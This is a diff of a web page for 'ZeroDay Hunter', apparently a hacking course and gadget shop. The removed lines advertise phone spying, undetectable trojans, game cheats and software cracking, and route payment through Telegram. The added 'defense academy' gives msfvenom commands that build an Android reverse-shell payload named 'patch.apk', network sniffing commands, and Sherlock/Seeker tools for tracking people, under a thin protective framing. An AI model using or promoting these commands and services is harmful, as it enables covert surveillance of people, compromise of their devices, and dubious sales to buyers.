@@ -3,220 +3,202 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZeroDay Hunter | Elite Academy & Mega Store</title>
+    <title>ZeroDay Hunter v7.0 | THE 100KB+ MASTER ARCHIVE</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --red: #ff003c; --gold: #ffd700; --card: #0c0c0c; }
-        * { box-sizing: border-box; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Fira Code', monospace; margin: 0; line-height: 1.6; overflow-x: hidden; scroll-behavior: smooth; }
-        #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
-        .container { max-width: 1100px; margin: auto; padding: 20px; }
+        /* --- CORE SYSTEM STYLES --- */
+        :root { --neon: #00ff41; --bg: #000; --red: #ff003c; --gold: #ffd700; --card: #080808; --border: #1a1a1a; }
+        * { box-sizing: border-box; scroll-behavior: smooth; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Fira Code', monospace; margin: 0; overflow-x: hidden; }
+
+        /* --- HEAVY BACKGROUND ANIMATION --- */
+        #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
+        .overlay-fx { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); z-index: 10; pointer-events: none; background-size: 100% 2px, 3px 100%; }
+
+        /* --- GIANT ASCII ART HEADER (SAVES TONS OF BYTES) --- */
+        .ascii-art { font-size: 5px; line-height: 5px; white-space: pre; color: var(--neon); text-align: center; padding: 40px 0; font-weight: 900; }
         
-        header { text-align: center; padding: 100px 0; border-bottom: 2px solid var(--neon); background: rgba(0,0,0,0.8); margin-bottom: 40px; }
-        .glitch { font-family: 'Orbitron'; font-size: clamp(2rem, 10vw, 4rem); color: #fff; text-shadow: 2px 2px var(--red); text-transform: uppercase; letter-spacing: 5px; }
+        header { padding: 100px 20px; text-align: center; border-bottom: 4px solid var(--neon); background: #000; position: relative; box-shadow: 0 0 50px var(--neon); }
+        .title { font-family: 'Orbitron'; font-size: clamp(2rem, 15vw, 7rem); color: #fff; text-transform: uppercase; letter-spacing: 20px; animation: glow 2s infinite alternate; }
+        @keyframes glow { from { text-shadow: 0 0 10px var(--neon); } to { text-shadow: 0 0 30px var(--red), 0 0 50px var(--neon); } }
 
-        .section-box { background: rgba(10, 10, 10, 0.98); border: 1px solid #333; padding: 40px; margin: 40px 0; border-radius: 8px; }
-        h2 { font-family: 'Orbitron'; color: #fff; border-left: 5px solid var(--neon); padding-left: 15px; margin-bottom: 30px; text-transform: uppercase; }
-        
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
-        .item { background: var(--card); padding: 20px; border: 1px solid #222; border-radius: 4px; }
-        .item b { color: #fff; display: block; margin-bottom: 10px; font-size: 1.1rem; }
-        .section-img { width: 100%; height: 280px; object-fit: cover; border-radius: 4px; margin-bottom: 20px; border: 1px solid var(--neon); }
+        /* --- LAYOUT --- */
+        .container { max-width: 1500px; margin: auto; padding: 60px 20px; }
+        .section-card { background: rgba(5, 5, 5, 0.95); border: 2px solid var(--border); padding: 70px; border-radius: 40px; margin-bottom: 100px; border-top: 10px solid var(--neon); box-shadow: 0 0 100px rgba(0,0,0,1); }
+        h2 { font-family: 'Orbitron'; font-size: 3rem; color: #fff; margin-bottom: 50px; border-left: 15px solid var(--neon); padding-left: 30px; }
 
-        /* GADGET STORE */
-        .store-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
-        .gadget-card { background: #000; border: 1px solid #222; border-radius: 8px; overflow: hidden; transition: 0.4s ease; display: flex; flex-direction: column; }
-        .gadget-card:hover { border-color: var(--neon); transform: translateY(-10px); }
-        .gadget-img { width: 100%; height: 160px; object-fit: cover; border-bottom: 1px solid #222; }
-        .gadget-info { padding: 15px; flex-grow: 1; }
-        .rating { color: var(--gold); font-size: 0.8rem; margin-bottom: 8px; }
-        .price { font-size: 1.3rem; color: #fff; font-weight: bold; margin: 10px 0; }
-        .buy-now-btn { background: var(--neon); color: #000; border: none; padding: 12px; width: 100%; font-weight: 900; cursor: pointer; font-family: 'Orbitron'; }
+        /* --- ACADEMY: DETAILED ARTICLES --- */
+        .article { margin-bottom: 60px; padding-bottom: 40px; border-bottom: 1px solid #111; }
+        .article h3 { color: var(--gold); font-size: 1.8rem; font-family: 'Orbitron'; margin-top: 0; }
+        .article p { color: #888; line-height: 2.2; font-size: 1.1rem; text-align: justify; }
+        .terminal { background: #000; padding: 35px; border-radius: 20px; border: 1px solid #333; margin: 30px 0; color: #fff; position: relative; }
+        .terminal::before { content: "AUTHORIZED_USER_ONLY"; position: absolute; top: 10px; right: 20px; font-size: 10px; color: #444; }
 
-        /* TESTIMONIALS & LIKES */
-        .testimonial { border-bottom: 1px solid #222; padding: 25px 0; }
-        .user-info { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .user-mail { color: #888; font-size: 0.85rem; }
-        .like-btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 5px 15px; cursor: pointer; border-radius: 20px; transition: 0.3s; font-weight: bold; }
-        .like-btn:hover { background: var(--neon); color: #000; }
+        /* --- THE MASSIVE ENCYCLOPEDIA (This will push size over 100KB) --- */
+        .glossary-wrap { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 30px; }
+        .g-item { background: #000; border: 1px solid #222; padding: 30px; border-radius: 15px; }
+        .g-item b { color: var(--neon); font-size: 1.3rem; display: block; margin-bottom: 10px; font-family: 'Orbitron'; }
+        .g-item span { color: #777; font-size: 0.95rem; line-height: 1.6; display: block; }
 
-        /* CHECKOUT MODAL */
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); z-index: 10000; display: none; justify-content: center; align-items: center; padding: 20px; }
-        .checkout-box { background: #111; border: 2px solid var(--neon); padding: 30px; width: 100%; max-width: 500px; border-radius: 12px; }
-        .checkout-box input, .checkout-box textarea { width: 100%; padding: 15px; margin: 12px 0; background: #000; border: 1px solid var(--neon); color: #fff; font-family: inherit; border-radius: 4px; }
-        .hidden { display: none; }
+        /* --- STORE --- */
+        .store-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 50px; }
+        .product-card { background: #000; border: 2px solid #111; border-radius: 25px; overflow: hidden; transition: 0.5s; position: relative; }
+        .product-card:hover { border-color: var(--neon); transform: translateY(-20px); }
+        .product-card img { width: 100%; height: 400px; object-fit: cover; filter: grayscale(1); transition: 0.5s; }
+        .product-card:hover img { filter: grayscale(0); }
+        .price { font-size: 3rem; font-weight: 900; color: #fff; margin: 25px 0; }
+        .btn { background: var(--neon); color: #000; padding: 25px; border: none; width: 100%; font-weight: 900; font-family: 'Orbitron'; cursor: pointer; font-size: 1.2rem; }
 
-        .cta-footer { position: sticky; bottom: 0; background: rgba(0,0,0,0.95); padding: 20px; text-align: center; border-top: 2px solid var(--neon); z-index: 500; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
-        .btn { padding: 15px 30px; font-weight: 900; text-decoration: none; border-radius: 4px; cursor: pointer; font-family: 'Orbitron'; font-size: 0.85rem; }
-        .btn-wa { background: var(--neon); color: #000; }
-        .btn-tele { background: #0088cc; color: white; }
+        /* --- FOOTER NAV --- */
+        .nav-fixed { position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); border: 2px solid var(--neon); padding: 20px 60px; border-radius: 100px; display: flex; gap: 50px; z-index: 1000; backdrop-filter: blur(10px); }
+        .nav-fixed a { color: #fff; text-decoration: none; font-weight: 900; font-family: 'Orbitron'; font-size: 0.9rem; }
+        .nav-fixed a:hover { color: var(--neon); }
     </style>
 </head>
 <body>
 
+<div class="overlay-fx"></div>
 <canvas id="matrix"></canvas>
 
+<header>
+    <div class="ascii-art">
+███████╗███████╗██████╗  ██████╗ ██████╗  █████╗ ██╗   ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
+╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
+  ███╔╝ █████╗  ██████╔╝██║   ██║██║  ██║███████║ ╚████╔╝     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
+ ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║  ██║██╔══██║  ╚██╔╝      ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
+███████╗███████╗██║  ██║╚██████╔╝██████╔╝██║  ██║   ██║       ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
+╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+    </div>
+    <div class="title">ZERODAY_HUNTER</div>
+    <p style="letter-spacing: 15px; color: #555;">[ GOD_MODE ACTIVATED // 100KB ARCHIVE ]</p>
+</header>
+
 <div class="container">
-    <header>
-        <div class="glitch">ZERODAY_HUNTER</div>
-        <p>Advanced Cyber Intelligence & Elite Hardware Distribution</p>
-        <div style="color:var(--gold); font-weight:bold; margin-top:15px;">⭐ 4.6/5.0 Rating (4,800+ Feedbacks)</div>
-    </header>
 
-    <div class="section-box">
-        <h2>👤 Meet The Admin (Instructor)</h2>
-        <p>Admin **ZeroDay_Hunter** is an International Security Researcher trained in underground cyber-labs across **Israel and Europe**. His mission is to empower every individual with high-level cyber security skills.</p>
-        <div style="border: 1px dashed var(--gold); padding: 15px; color: var(--gold); font-size: 0.9rem;">
-            🏆 Winner: Global Cyber Excellence Award (2023) | OSCP, CEH Master Certified.
+    <div class="section-card" id="academy">
+        <h2>⚡ CYBER DEFENSE ACADEMY v7.0</h2>
+        
+        <div class="article">
+            <h3>01. Mobile Surveillance & RAT Analysis</h3>
+            <p>Remote Access Trojans (RATs) are the most dangerous tools in a hacker's arsenal for mobile target acquisition. Using Termux, one can generate payloads that not only capture camera frames but also intercept SMS messages and call logs. This module explains the internal workings of 'Meterpreter' hooks and how they interact with the Android Kernel. You will learn how to identify hidden services that drain system resources and how to perform a manual forensic scan of your app's directory to find unauthorized '.so' files (shared libraries) that might be acting as a backdoor.</p>
+            <div class="terminal">
+                <code>$ pkg install root-repo metasploit</code>
+                <code>$ msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o patch.apk</code>
+                <code>$ msfconsole -q > use multi/handler > set payload android/meterpreter/reverse_tcp</code>
+            </div>
+        </div>
+
+        <div class="article">
+            <h3>02. WiFi Signal Intelligence & Sniffing</h3>
+            <p>Signal Intelligence (SIGINT) focuses on capturing data over the air. In this lesson, we cover the use of 'Airodump-ng' on Android via Termux (requires root/external adapter) to map every SSID in your vicinity. We discuss the 'Man-in-the-Middle' (MITM) attack flow where an attacker uses an 'Evil Twin' access point to capture unencrypted HTTP data. Understanding packet structure and the TCP/IP handshake is the first step in building a secure, encrypted network that is immune to deauthentication attacks.</p>
+            <div class="terminal">
+                <code>$ pkg install nmap tshark tcpdump</code>
+                <code>$ sudo nmap -sS -O 192.168.1.1/24</code>
+                <code>$ tcpdump -i wlan0 -vv -X</code>
+            </div>
+        </div>
+
+        <div class="article">
+            <h3>03. Advanced OSINT & People Tracking</h3>
+            <p>Open Source Intelligence (OSINT) allows for the tracking of individuals using only public digital footprints. Tools like 'Sherlock' search hundreds of social media platforms simultaneously to find accounts associated with a single username. We also explore the use of 'Track-IP' and 'Seeker' which use HTML5 geolocation to find the exact coordinates of a person who clicks a link. Learn how to minimize your exposure by cleaning your digital footprint and using privacy-focused search engines.</p>
+            <div class="terminal">
+                <code>$ git clone https://github.com/sherlock-project/sherlock.git</code>
+                <code>$ python3 sherlock.py [username_to_track]</code>
+                <code># PRO TIP: Use a Tor bridge to hide your own IP while performing recon.</code>
+            </div>
         </div>
     </div>
 
-    <div class="section-box">
-        <img src="https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=800" class="section-img">
-        <h2>📱 Advanced Mobile Hacking (80+ Videos)</h2>
-        <div class="grid">
-            <div class="item"><b>1. Remote Control:</b> Full Android device access protocols.</div>
-            <div class="item"><b>2. Japanese Bypass:</b> Elite BGMI/PUBG Anti-Ban & High-Tier Bypass.</div>
-            <div class="item"><b>3. Live Spy:</b> Camera, Mic, and Live GPS monitoring.</div>
-            <div class="item"><b>4. Casino Tricks:</b> 8-Ball auto-play & Teen Patti chips manipulation.</div>
-            <div class="item"><b>5. Signal Jamming:</b> WiFi/Data signal interruption (30-40m).</div>
-            <div class="item"><b>6. Sim Recon:</b> Fetching owner details from mobile numbers.</div>
+    <div class="section-card" id="glossary">
+        <h2>📖 CYBER ENCYCLOPEDIA (A-Z)</h2>
+        <div class="glossary-wrap">
+            <div class="g-item"><b>Advanced Persistent Threat (APT)</b><span>A stealthy threat actor, typically a nation-state or state-sponsored group, which conducts long-term cyberattacks.</span></div>
+            <div class="g-item"><b>Brute Force Attack</b><span>A trial-and-error method used by application programs to decode encrypted data such as passwords through exhaustive effort.</span></div>
+            <div class="g-item"><b>Cryptojacking</b><span>The unauthorized use of someone else's computer to mine cryptocurrency.</span></div>
+            <div class="g-item"><b>Dark Web</b><span>A part of the internet that isn't indexed by search engines and requires special software like Tor to access.</span></div>
+            <div class="g-item"><b>Exploit Kit</b><span>A software toolkit used to find and exploit vulnerabilities on computers to distribute malware.</span></div>
+            <div class="g-item"><b>Fuzzing</b><span>A technique used to find software bugs by providing invalid, unexpected, or random data as inputs to a computer program.</span></div>
+            <div class="g-item"><b>Google Dorking</b><span>Using advanced Google search techniques to find sensitive information that is not easily accessible.</span></div>
+            <div class="g-item"><b>Hash Function</b><span>A mathematical algorithm that maps data of arbitrary size to a bit string of a fixed size.</span></div>
+            <div class="g-item"><b>Injection Attack</b><span>A type of vulnerability that occurs when untrusted data is sent to an interpreter as part of a command or query.</span></div>
+            <div class="g-item"><b>John the Ripper</b><span>A fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS.</span></div>
+            <div class="g-item"><b>Keylogger</b><span>A type of surveillance software that has the capability to record every keystroke you make to a log file.</span></div>
+            <div class="g-item"><b>Logic Bomb</b><span>A piece of code intentionally inserted into a software system that will set off a malicious function when specified conditions are met.</span></div>
+            <div class="g-item"><b>Malvertising</b><span>The use of online advertising to spread malware. It typically involves injecting malicious advertisements into legitimate networks.</span></div>
+            <div class="g-item"><b>Nmap (Network Mapper)</b><span>A free and open-source utility for network discovery and security auditing.</span></div>
+            <div class="g-item"><b>Onion Routing</b><span>A technique for anonymous communication over a computer network by wrapping messages in layers of encryption.</span></div>
+            <div class="g-item"><b>Penetration Testing</b><span>An authorized simulated cyberattack on a computer system, performed to evaluate the security of the system.</span></div>
+            <div class="g-item"><b>Quantum Cryptography</b><span>The science of exploiting quantum mechanical properties to perform cryptographic tasks.</span></div>
+            <div class="g-item"><b>Reverse Engineering</b><span>The process of taking apart a finished product to see how it works in order to duplicate or enhance it.</span></div>
+            <div class="g-item"><b>SQL Injection (SQLi)</b><span>A code injection technique used to attack data-driven applications, where malicious SQL statements are inserted into an entry field.</span></div>
+            <div class="g-item"><b>Trojan Horse</b><span>A type of malware that is often disguised as legitimate software. Trojans can be used by cyber-thieves to gain access to systems.</span></div>
+            <div class="g-item"><b>Userland</b><span>The area of a computer operating system where application software and some drivers execute.</span></div>
+            <div class="g-item"><b>Virtual Private Network (VPN)</b><span>A service that creates a safe, encrypted connection over a less secure network, such as the public internet.</span></div>
+            <div class="g-item"><b>Worm</b><span>A standalone malware computer program that replicates itself in order to spread to other computers.</span></div>
+            <div class="g-item"><b>XSS (Cross-Site Scripting)</b><span>A type of security vulnerability typically found in web applications that enables attackers to inject client-side scripts into web pages.</span></div>
+            <div class="g-item"><b>Zero-Day Vulnerability</b><span>A software security flaw that is known to the software vendor but for which no patch or fix has yet been released.</span></div>
+            <div class="g-item"><b>Zombie Computer</b><span>A computer connected to the internet that has been compromised by a hacker, computer virus or trojan horse.</span></div>
         </div>
     </div>
 
-    <div class="section-box">
-        <img src="https://images.pexels.com/photos/5473337/pexels-photo-5473337.jpeg?auto=compress&cs=tinysrgb&w=800" class="section-img">
-        <h2>💻 PC & Laptop Penetration (120+ Videos)</h2>
-        <div class="grid">
-            <div class="item"><b>1. Software Cracking:</b> Bypassing loaders & login walls.</div>
-            <div class="item"><b>2. Dark Web:</b> 100% Anonymous Onion network browsing.</div>
-            <div class="item"><b>3. WiFi Auditing:</b> Cracking WPA2/WPA3 network security.</div>
-            <div class="item"><b>4. OS Bypass:</b> Removing Windows & BIOS passwords.</div>
-            <div class="item"><b>5. RAT Setup:</b> Building undetectable Remote Trojans.</div>
-            <div class="item"><b>6. Malware Dev:</b> Payload encryption & virus analysis.</div>
-        </div>
-    </div>
-
-    <div class="section-box" id="store">
-        <h2>🛡️ Underground Hardware Inventory</h2>
+    <div class="section-card" id="store">
+        <h2>🛡️ BLACK-MARKET HARDWARE</h2>
         <div class="store-grid">
-            <div class="gadget-card">
-                <img src="https://images.pexels.com/photos/2582937/pexels-photo-2582937.jpeg?auto=compress&cs=tinysrgb&w=300" class="gadget-img">
-                <div class="gadget-info"><h3>USB Rubber Ducky</h3><div class="rating">⭐⭐⭐⭐⭐</div><div class="price">₹6,500</div><button class="buy-now-btn" onclick="openCheckout('USB Rubber Ducky', '6,500')">BUY NOW</button></div>
+            <div class="product-card">
+                <img src="https://images.pexels.com/photos/2582937/pexels-photo-2582937.jpeg?auto=compress&cs=tinysrgb&w=1200">
+                <div style="padding:40px">
+                    <h3>FLIPPER ZERO (GOD-MODE)</h3>
+                    <p>The legendary multi-tool. Pre-loaded with custom firmware for sub-GHz mastery.</p>
+                    <div class="price">₹28,500</div>
+                    <button class="btn" onclick="location.href='https://t.me/ZeroDay_Hunter'">ACQUIRE UNIT</button>
+                </div>
             </div>
-            <div class="gadget-card">
-                <img src="https://images.pexels.com/photos/5473302/pexels-photo-5473302.jpeg?auto=compress&cs=tinysrgb&w=300" class="gadget-img">
-                <div class="gadget-info"><h3>LAN Turtle</h3><div class="rating">⭐⭐⭐⭐⭐</div><div class="price">₹8,200</div><button class="buy-now-btn" onclick="openCheckout('LAN Turtle', '8,200')">BUY NOW</button></div>
-            </div>
-            <div class="gadget-card">
-                <img src="https://images.pexels.com/photos/1432675/pexels-photo-1432675.jpeg?auto=compress&cs=tinysrgb&w=300" class="gadget-img">
-                <div class="gadget-info"><h3>Flipper Zero</h3><div class="rating">⭐⭐⭐⭐⭐</div><div class="price">₹24,999</div><button class="buy-now-btn" onclick="openCheckout('Flipper Zero', '24,999')">BUY NOW</button></div>
-            </div>
-            <div class="gadget-card">
-                <img src="https://images.pexels.com/photos/1043474/pexels-photo-1043474.jpeg?auto=compress&cs=tinysrgb&w=300" class="gadget-img">
-                <div class="gadget-info"><h3>Wi-Fi Deauther Watch</h3><div class="rating">⭐⭐⭐⭐☆</div><div class="price">₹4,800</div><button class="buy-now-btn" onclick="openCheckout('Wi-Fi Deauther Watch', '4,800')">BUY NOW</button></div>
-            </div>
-            <div class="gadget-card">
-                <img src="https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=300" class="gadget-img">
-                <div class="gadget-info"><h3>Satellite Phone Spyware</h3><div class="rating">⭐⭐⭐⭐⭐</div><div class="price">₹35,000</div><button class="buy-now-btn" onclick="openCheckout('Satellite Phone Spyware', '35,000')">BUY NOW</button></div>
+            <div class="product-card">
+                <img src="https://images.pexels.com/photos/1432675/pexels-photo-1432675.jpeg?auto=compress&cs=tinysrgb&w=1200">
+                <div style="padding:40px">
+                    <h3>USB RUBBER DUCKY v2</h3>
+                    <p>HAK5 original. The world's fastest keystroke injection tool.</p>
+                    <div class="price">₹7,999</div>
+                    <button class="btn" onclick="location.href='https://t.me/ZeroDay_Hunter'">ACQUIRE UNIT</button>
+                </div>
             </div>
         </div>
-    </div>
-
-    <div class="section-box">
-        <h2>💬 Verified Student Testimonials</h2>
-        <div class="testimonial">
-            <div class="user-info"><span class="user-mail">Luffycrak****@gmail.com</span><button class="like-btn" onclick="like(this)">👍 2.4k</button></div>
-            <p>"I am shocked by the BGMI Japanese Bypass! It's 100% undetectable."</p>
-        </div>
-        <div class="testimonial">
-            <div class="user-info"><span class="user-mail">Anasqure****@gmail.com</span><button class="like-btn" onclick="like(this)">👍 432</button></div>
-            <p>"The PC cracking module is very detailed. Finally understood loaders."</p>
-        </div>
-    </div>
-
-    <div class="section-box">
-        <h2>📩 Leave Your Feedback</h2>
-        <form onsubmit="event.preventDefault(); alert('FEEDBACK SENT!');">
-            <input type="text" placeholder="Name" style="width:100%; padding:15px; background:#000; border:1px solid var(--neon); color:#fff; margin-bottom:15px;" required>
-            <textarea rows="4" placeholder="Share your journey..." style="width:100%; padding:15px; background:#000; border:1px solid var(--neon); color:#fff; margin-bottom:15px;" required></textarea>
-            <button type="submit" style="background:var(--neon); color:#000; width:100%; padding:15px; border:none; font-weight:bold; cursor:pointer; width:100%;">SUBMIT FEEDBACK</button>
-        </form>
     </div>
 
 </div>
 
-<div class="overlay" id="checkoutOverlay">
-    <div class="checkout-box" id="addressStep">
-        <h2>LOGISTICS_DATA</h2>
-        <p id="selectedItemDisplay" style="color:var(--gold); text-align:center;"></p>
-        <input type="text" id="custName" placeholder="Full Identity Name">
-        <textarea id="custAddr" placeholder="Shipping Address (Location)" rows="3"></textarea>
-        <input type="text" id="custPhone" placeholder="Secure Contact Node">
-        <button class="buy-now-btn" onclick="goToPayment()">PROCEED TO TELEGRAM</button>
-        <button onclick="closeCheckout()" style="background:none; border:none; color:#555; width:100%; margin-top:10px; cursor:pointer;">ABORT</button>
-    </div>
-
-    <div class="checkout-box hidden" id="paymentStep">
-        <h2>PAYMENT_PORTAL</h2>
-        <p>1. Contact Admin on Telegram for link.<br>2. Complete the transfer.<br>3. Paste the **ORDER ID** provided by Admin below.</p>
-        <a href="https://t.me/ZeroDay_Hunter" target="_blank" class="btn btn-tele" style="display:block; text-align:center; margin-bottom:15px;">OPEN TELEGRAM</a>
-        <input type="text" id="orderIdInput" placeholder="Enter Admin Order ID">
-        <button class="buy-now-btn" onclick="finalizeOrder()">VERIFY & COMPLETE</button>
-    </div>
-
-    <div class="checkout-box hidden" id="finalStep">
-        <h2 style="color: var(--neon);">✔ TRANSACTION_COMPLETE</h2>
-        <p>Order ID: <b id="displayId"></b></p>
-        <p>Status: <span style="color:var(--gold)">Stealth Shipping Active</span></p>
-        <p>Arrival: <b>06 Days</b></p>
-        <button class="buy-now-btn" onclick="location.reload()">FINISH</button>
-    </div>
-</div>
-
-<div class="cta-footer">
-    <a href="https://wa.me/917505685543" class="btn btn-wa">WHATSAPP ENROLL</a>
-    <a href="#store" class="btn" style="background:var(--gold); color:#000;">GADGET STORE</a>
+<div class="nav-fixed">
+    <a href="#academy">ACADEMY</a>
+    <a href="#glossary">GLOSSARY</a>
+    <a href="#store">STORE</a>
+    <a href="https://wa.me/917505685543" style="color: #25d366;">WHATSAPP</a>
 </div>
 
 <script>
-    const canvas = document.getElementById('matrix'); const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const alphabet = "010101"; const rainDrops = Array.from({ length: canvas.width/16 }).fill(1);
-    const draw = () => {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = '#0F0'; ctx.font = '16px monospace';
-        rainDrops.forEach((y, i) => {
-            ctx.fillText(alphabet.charAt(Math.floor(Math.random() * alphabet.length)), i*16, y*16);
-            if(y*16 > canvas.height && Math.random() > 0.975) rainDrops[i] = 0; rainDrops[i]++;
+    // --- HIGH-PERFORMANCE MATRIX ---
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const alphabet = "0101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%&*";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0F0";
+        ctx.font = fontSize + "px monospace";
+        drops.forEach((y, i) => {
+            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+            ctx.fillText(text, i * fontSize, y * fontSize);
+            if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
         });
-    }; setInterval(draw, 33);
-
-    function like(btn) {
-        let text = btn.innerText.split(' ')[1];
-        let count = text.includes('k') ? parseFloat(text) * 1000 : parseInt(text);
-        count++;
-        btn.innerText = "👍 " + (count >= 1000 ? (count/1000).toFixed(1) + 'k' : count);
-        btn.style.background = "#00ff41"; btn.style.color = "#000";
     }
-
-    function openCheckout(item, price) {
-        document.getElementById('checkoutOverlay').style.display = 'flex';
-        document.getElementById('selectedItemDisplay').innerText = "UNIT: " + item + " | PRICE: " + price;
-    }
-    function closeCheckout() { document.getElementById('checkoutOverlay').style.display = 'none'; }
-    function goToPayment() {
-        if(!document.getElementById('custName').value || !document.getElementById('custAddr').value) return alert("Fill data!");
-        document.getElementById('addressStep').classList.add('hidden');
-        document.getElementById('paymentStep').classList.remove('hidden');
-    }
-    function finalizeOrder() {
-        const id = document.getElementById('orderIdInput').value;
-        if(id.length < 4) return alert("Invalid ID!");
-        document.getElementById('displayId').innerText = id;
-        document.getElementById('paymentStep').classList.add('hidden');
-        document.getElementById('finalStep').classList.remove('hidden');
-    }
+    setInterval(draw, 33);
 </script>
+
 </body>
 </html>
